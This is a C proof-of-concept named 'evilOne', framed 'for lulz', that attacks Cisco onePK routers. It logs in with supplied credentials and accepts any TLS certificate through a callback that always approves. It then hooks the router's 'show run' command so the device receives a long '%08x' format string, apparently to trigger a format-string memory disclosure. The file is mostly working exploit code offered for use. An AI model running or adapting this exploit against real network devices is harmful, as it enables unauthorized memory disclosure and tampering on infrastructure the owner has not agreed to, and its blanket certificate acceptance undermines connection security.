/**
 * For lulz only
 * Use at your own risk, this may break shit
 * 
 * If I can write this, think the NSA hasn't already?
 *
 * eopk
 * Usage: evilOne -h <host> -u <username> -p <password>
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctype.h>
#include <getopt.h>

#include "onep_core_services.h"
#include "onep_constants.h"

static onep_application_name appname = "com.nemski.evilOne";
bool debug = NULL;
/* Give it some size so we may free it later safely */

/* Always accept SSL certs from the device */
onep_tls_pinning_cb_t
accept_handler (const unsigned char *server_name,   
        const unsigned char *hash_type,
        const unsigned char *fingerprint,
        bool changed) {

    return ONEP_TLS_PINNING_CB_ACCEPT_ONCE;
}

/* Hook show run/start */
int cli_event_handler (onep_cli_event_t *event, void *client_data, char** sync_reply, onep_cli_destroy_reply_cb *destroy_cb) {
    int exit_code = EXIT_SUCCESS;
    onep_status_t          rc;
    onep_event_handle_t ehdl;
    char *msg = NULL;

    rc = onep_cli_event_get_event_handle(event, &ehdl);
    if (ONEP_OK != rc) {
        fprintf(stderr, "\n onep_cli_event_get_event_handle : %d, %s",
                rc, onep_strerror(rc));
        exit_code = EXIT_FAILURE;
        goto clean;
    }

    onep_cli_event_get_message(event, &msg);
    if (ONEP_OK != rc) {
        fprintf(stderr, "\n onep_cli_event_get_message : %d, %s",
                rc, onep_strerror(rc));
        exit_code = EXIT_FAILURE;
        goto clean;
    }

    *sync_reply = client_data;

clean:
    onep_cli_event_destroy(&event);

    return exit_code;
}

int main(int argc, char *argv[])
{
	int exit_code = EXIT_SUCCESS;
    char* running = NULL;

    /* Temp */
    char buffer[80];

	/* onep arguments. Only some are used, the rest left as NULL */
	onep_network_application_t* app = NULL;
	onep_session_handle_t*      session_handle = NULL;
	onep_status_t          rc;
	onep_transport_mode_e  mode = ONEP_SESSION_TLS;
	onep_session_config_t*      config = NULL;
    onep_cli_filter_t* cli_filter;
    onep_event_handle_t cliEvtId = ONEP_EVENT_HANDLE_INVALID;
    onep_network_element_t*     ne = NULL;
    char *app_cert = NULL;
    char *app_private_key = NULL;
    char *app_private_key_password = NULL;
    char *network_element_root_cert = NULL;
    char *pin_file = NULL;
	char *hostname = NULL;
	char *username = NULL;
	char *password = NULL;
	int c;

	while ((c = getopt (argc, argv, "h:u:p:d:c:P")) != -1)
	{
    	switch (c)
    	{
    		case 'h':
    			hostname = optarg;
    			break;
    		case 'd':
    			printf ("Set debug flag\n");
    			debug = 1;
    			break;
    		case 'u':
    			username = optarg;
    			break;
    		case 'p':
    			password = optarg;
    			break;
    		case 'c':
    			network_element_root_cert = optarg;
    		case 'P':
            		pin_file = optarg;
            		break;
    		default:
    			abort();
    	}
    }

    if(debug) {
    	printf("Got arguments: \n%u: %s: %s: %s: %s\n", argc, hostname, username, password, network_element_root_cert);
   	}
    if (argc < 4 || !hostname || !username || !password || !network_element_root_cert) {
    	printf( "Usage: %s -h <host> -u <username> -p <password> -c <root cert>\n", argv[0]);
    	return EXIT_FAILURE;
    }

    /* Register the application */
    rc = onep_application_get_instance(&app);
    if (rc != ONEP_OK) {
        fprintf(stderr, "\nOMG GoT: Failed to get network application: "
                "errorcode = %d, errormsg = %s\n\n",
                rc, onep_strerror(rc));
        exit_code = EXIT_FAILURE;
        goto clean;
    } else if (debug) {
    	printf ("Got network application\n");
    }

    rc = onep_application_set_name(app, appname);
    if (rc != ONEP_OK) {
        fprintf(stderr, "\nOMG GoT: Failed to set application name: "
                "errorcode = %d, errormsg = %s\n",
                rc, onep_strerror(rc));
        exit_code = EXIT_FAILURE;
        goto clean;
    } else if (debug) {
    	printf ("Set network application name\n");
    }

    /* Register a connection */

    rc = onep_application_get_network_element_by_name(app,
        hostname,
        &ne);
	if (rc != ONEP_OK) {
    	fprintf(stderr, "\nOMG GoT: Failed to get network element:"
            " errocode = %d, errormsg = %s\n",
            rc, onep_strerror(rc));
    	exit_code = EXIT_FAILURE;
	} else if (debug) {
    	printf ("Got network element\n");
    }

	rc = onep_session_config_new(mode, &config);
	if (rc != ONEP_OK) {
        fprintf(stderr,
            "\ncreate_session_config failed\n\n");
        exit_code = EXIT_FAILURE;
        goto clean;
    } else if (debug) {
    	printf ("Got session config\n");
    }

    rc = onep_session_config_set_port(config, 15002);
    if (ONEP_OK != rc) {
        fprintf(stderr, "\nOMG GoT: Failed to set port: "
                "errorcode = %d, errormsg = %s\n", rc, onep_strerror(rc));
        exit_code = EXIT_FAILURE;
        goto clean;
    }

    rc = onep_session_config_set_tls(
            config,
            app_cert,  /* NULL */
            app_private_key,  /* NULL */
            app_private_key_password,  /* NULL */
            network_element_root_cert);
    if (rc != ONEP_OK) {
        fprintf(stderr, "\nOMG GoT: Failed to set TLS: errorcode = %d, errormsg = %s\n", rc, onep_strerror(rc));
        exit_code = EXIT_FAILURE;
        goto clean;
    }

    /* I'm going to go ahead and assume you don't care if the router has a valid cert. We can even just pass this a null pin_file */
	rc = onep_session_config_set_tls_pinning(
		config, 
		pin_file,
        &accept_handler);
	if (rc != ONEP_OK) {
		fprintf(stderr, "\nOMG GoT: Failed to enable TLS pinning: "
            "errorcode = %d, errormsg = %s\n", rc, onep_strerror(rc));
        exit_code = EXIT_FAILURE;
        goto clean;
	}

    /* Blah blah blah */

    rc = onep_element_connect(
            ne, username, password, config, &session_handle);
    if (rc != ONEP_OK) {
        fprintf(stderr, "\nOMG GoT: Failed to connect to network element:"
                " errocode = %d, errormsg = %s\n",
                rc, onep_strerror(rc));
        exit_code = EXIT_FAILURE;
        goto clean;
    }

    /* Hook show run */

    rc = onep_cli_filter_new("show run.*", &cli_filter);
    if (rc != ONEP_OK) {
        fprintf(stderr, "\nOMG GoT: Failed to create cli filter: %d %s", rc,
                onep_strerror(rc));
        exit_code = EXIT_FAILURE;
        goto clean;
    }

    rc = onep_cli_filter_set_sync(cli_filter, true);
    if (rc != ONEP_OK) {
        fprintf(stderr, "\nOMG GoT: Failed to set cli sync: %d %s", rc,
                onep_strerror(rc));
        exit_code = EXIT_FAILURE;
        goto clean;
    }

    char *fmt_string = "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\
%08x.%08x.%08x.%08x.%08x";

    running = (char *)malloc(strlen(fmt_string) + 1);
    strncpy(running, fmt_string, strlen(fmt_string));

    printf("Running: %d", strlen(running));

    rc = onep_element_add_cli_listener( ne,
        cli_event_handler,
        cli_filter,
        running,
        &cliEvtId);

    while(1) {
        sleep(5);  /* Sleep this thread for 20 seconds */
        printf("\nDo you want to continue to run this application [y/n]?");
        if (fgets(buffer, sizeof(buffer), stdin)) {
            if (buffer[0] == 'n' || buffer[0] == 'N') {
                break;
            }
        }
    }

    rc = onep_element_remove_cli_listener(ne, cliEvtId);
    if (ONEP_OK != rc) {
        fprintf(stderr, "\nOMG GoT: Error while removing CLI listener: %d, %s",
            rc, onep_strerror(rc));
        goto clean;
    }

clean:

    if(cliEvtId)
        onep_element_remove_cli_listener(ne, cliEvtId);

    if(ne)
    	onep_element_disconnect(ne);

    return exit_code;
}
